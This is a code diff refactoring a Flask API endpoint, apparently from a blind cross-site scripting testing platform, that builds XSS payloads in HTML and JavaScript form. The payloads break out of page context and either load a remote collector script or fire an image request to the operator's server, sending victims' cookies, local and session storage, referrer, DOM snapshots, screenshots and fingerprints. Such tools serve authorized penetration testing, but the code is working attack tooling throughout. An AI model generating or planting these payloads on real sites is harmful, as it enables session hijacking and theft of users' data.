@@ -1,9 +1,10 @@
 import base64
 import json
+from typing import List
 
 from app import db
 from app.api.endpoints import bp
-from app.api.utils.shared import permissions
+from app.api.utils.shared import generate_data_response, generate_message_response, permissions
 from app.models import XSS, Client
 from flask import jsonify, request
 from flask_jwt_extended import jwt_required
@@ -19,92 +20,136 @@ PAYLOADS = {
 
 @bp.route("/xss/generate", methods=["POST"])
 @jwt_required()
-def xss_generate():
-    """Generates an XSS payload"""
+def generate_xss_payload():
 
-    data = request.get_json()
+    request_body = request.get_json()
 
-    client_id = data.get("client_id", None)
-    if not client_id:
-        return jsonify({"status": "error", "detail": "Missing client_id"}), 400
-    client = Client.query.filter_by(id=data["client_id"]).first_or_404()
+    if "client_id" not in request_body.keys() or not request_body["client_id"]:
+        return generate_message_response("Missing client ID", 400)
 
-    url = data.get("url", None)
-    if not url:
-        return jsonify({"status": "error", "detail": "Missing url"}), 400
+    if "url" not in request_body.keys() or not request_body["url"]:
+        return generate_message_response("Missing URL", 400)
 
-    xss_type = data.get("xss_type", None)
-    if not xss_type:
-        return jsonify({"status": "error", "detail": "Missing xss_type"}), 400
+    if "xss_type" not in request_body.keys() or not request_body["xss_type"]:
+        return generate_message_response("Missing XSS type", 400)
 
-    code_type = data.get("code_type", None)
-    if not code_type:
-        return jsonify({"status": "error", "detail": "Missing code_type"}), 400
+    if "code_type" not in request_body.keys() or not request_body["code_type"]:
+        return generate_message_response("Missing code type", 400)
 
-    to_gather = data.get("to_gather", [])
+    if "data_to_gather" not in request_body.keys():
+        return generate_message_response("Missing list of data to gather", 400)
 
-    tag_list = data.get("tags", [])
-    tags = ",".join(tag_list)
+    if "tags" not in request_body.keys():
+        return generate_message_response("Missing tags", 400)
 
-    if code_type == "html":
-        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
-            payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
-            ).decode()
-            payload_end = '")</script>'
-            payload = payload_start + payload_mid + payload_end
-            return jsonify({"status": "OK", "detail": payload}), 200
+    client = Client.query.filter_by(id=request_body["client_id"]).first_or_404()
 
-        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin_url" in to_gather or "referrer" in to_gather:
-            payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
-
-            payload_tags = f"tags={tags}" if tags else ""
-            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
-
-            payload_mid = "&".join([payload_tags, payload_to_gather]) if payload_tags else payload_to_gather
-            payload_end = "</script>"
-            payload = payload_start + payload_mid + payload_end
-            return jsonify({"status": "OK", "detail": payload}), 200
-
-        else:
-            payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
-            payload_tags = f"tags={tags}" if tags else ""
-            payload_start = f"{payload_start}?{payload_tags}" if payload_tags else payload_start
-            payload_end = '" />'
-            payload = payload_start + payload_end
-            return jsonify({"status": "OK", "detail": payload}), 200
+    if request_body["code_type"] == "html":
+        payload = generate_html_payload(request_body["data_to_gather"], request_body["tags"], request_body["url"], request_body["xss_type"], client)
 
     else:
-        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
-            payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
-            ).decode()
+        payload = generate_javascript_payload(request_body["data_to_gather"], request_body["tags"], request_body["url"], request_body["xss_type"], client)
 
-            payload_end = '")};document.body.appendChild(js);'
-            payload = payload_start + payload_mid + payload_end
-            return jsonify({"status": "OK", "detail": payload}), 200
+    return generate_message_response(payload)
 
-        else:
-            payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
 
-            payload_tags = f"tags={tags}" if tags else ""
-            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
+def generate_html_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
 
-            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_tags or payload_to_gather else payload_start
+    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
+        return generate_html_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)
 
-            payload_mid = ""
-            if payload_tags and payload_to_gather:
-                payload_mid = "&".join([payload_tags, payload_to_gather])
-            elif payload_tags:
-                payload_mid = payload_tags
-            elif payload_to_gather:
-                payload_mid = payload_to_gather
+    elif (
+        "local_storage" in data_to_gather
+        or "session_storage" in data_to_gather
+        or "cookies" in data_to_gather
+        or "origin_url" in data_to_gather
+        or "referrer" in data_to_gather
+    ):
+        return generate_html_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)
 
-            payload_end = ";"
-            payload = payload_start + payload_mid + payload_end
-            return jsonify({"status": "OK", "detail": payload}), 200
+    else:
+        return generate_html_payload_without_data(tag_list, url, xss_type, client)
+
+
+def generate_html_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+    payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
+    payload_mid = base64.b64encode(
+        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
+    ).decode()
+    payload_end = '")</script>'
+    payload = payload_start + payload_mid + payload_end
+    return payload
+
+
+def generate_html_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+
+    tags = ",".join(tag_list)
+
+    payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
+
+    payload_tags = f"tags={tags}" if tags else ""
+    payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')
+
+    payload_mid = "&".join([payload_tags, payload_to_gather]) if payload_tags else payload_to_gather
+    payload_end = "</script>"
+    payload = payload_start + payload_mid + payload_end
+    return payload
+
+
+def generate_html_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+
+    tags = ",".join(tag_list)
+
+    payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
+    payload_tags = f"tags={tags}" if tags else ""
+    payload_start = f"{payload_start}?{payload_tags}" if payload_tags else payload_start
+    payload_end = '" />'
+    payload = payload_start + payload_end
+    return payload
+
+
+def generate_javascript_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+
+    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
+        return generate_javascript_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)
+
+    else:
+        return generate_javascript_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)
+
+
+def generate_javascript_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+    payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
+    payload_mid = base64.b64encode(
+        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
+    ).decode()
+
+    payload_end = '")};document.body.appendChild(js);'
+    payload = payload_start + payload_mid + payload_end
+    return payload
+
+
+def generate_javascript_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
+
+    tags = ",".join(tag_list)
+
+    payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
+
+    payload_tags = f"tags={tags}" if tags else ""
+    payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')
+
+    payload_start = f"""{payload_start.rstrip('"')}?""" if payload_tags or payload_to_gather else payload_start
+
+    payload_mid = ""
+    if payload_tags and payload_to_gather:
+        payload_mid = "&".join([payload_tags, payload_to_gather])
+    elif payload_tags:
+        payload_mid = payload_tags
+    elif payload_to_gather:
+        payload_mid = payload_to_gather
+
+    payload_end = ";"
+    payload = payload_start + payload_mid + payload_end
+    return payload
 
 
 @bp.route("/xss/<int:xss_id>", methods=["GET"])
